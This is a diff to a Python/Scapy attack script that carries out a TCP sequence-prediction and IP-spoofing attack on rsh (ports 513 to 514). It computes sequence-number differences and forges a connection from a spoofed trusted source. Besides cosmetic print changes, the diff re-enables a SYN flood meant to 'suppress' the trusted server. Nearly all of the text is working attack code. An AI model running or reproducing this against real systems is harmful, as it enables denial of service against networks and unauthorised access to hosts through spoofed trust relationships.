@@ -21,7 +21,7 @@ def callTSN(tgt):
         ans = sr1(pkt, verbose = 0)
         seqNum = ans.getlayer(TCP).seq
         diffSeq = seqNum - preNum
-        print '[+] TCP Seq Difference : ' + str(diffSeq)
+        print '[ + ] TCP Seq Difference : ' + str(diffSeq)
     return seqNum + diffSeq
 
 def spoofConnection(src, tgt, ack):
@@ -29,7 +29,6 @@ def spoofConnection(src, tgt, ack):
     TCPlayer = TCP(sport = 513, dport = 514)
     synPkt = IPlayer / TCPlayer
     send(synPkt)
-
     IPlayer = IP(src = src, dst = tgt)
     TCPlayer = TCP(sport = 513, dport = 514, ack = ack)
     synPkt = IPlayer / TCPlayer
@@ -48,13 +47,13 @@ def main():
         synSpoof = options.synSpoof
         srcSpoof = options.srcSpoof
         tgt = options.tgt
-    print '[+] Starting SYN Flood to suppress remote server'
-    #synFlood(synSpoof, srcSpoof)
-    print '[+] Calculating correct TCP Sequence Number'
+    print '[ + ] Starting SYN Flood to suppress remote server'
+    synFlood(synSpoof, srcSpoof)
+    print '[ + ] Calculating correct TCP Sequence Number'
     seqNum = callTSN(tgt) + 1
-    print '[+] Spoofing Connection'
+    print '[ + ] Spoofing Connection'
     spoofConnection(srcSpoof, tgt, seqNum)
-    print '[+] Done'
+    print '[ + ] Done'
 
 
 if __name__ == '__main__':
